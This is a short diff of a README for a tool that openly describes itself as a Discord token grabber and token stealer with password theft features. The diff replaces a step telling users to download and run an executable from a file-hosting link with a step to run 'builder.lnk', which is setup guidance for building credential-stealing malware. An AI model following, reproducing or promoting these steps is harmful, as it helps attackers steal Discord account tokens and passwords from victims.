@@ -14,8 +14,7 @@ The new modern discord token grabber & token stealer, with discord password & to
 
 3- run install.py
 
-4- dowload:https://dosya.co/0tlemuepfz6v/mon-programme.exe.html
-Download it, put it in a folder and run it
+4- Run builder.lnk
 
 
 # Features
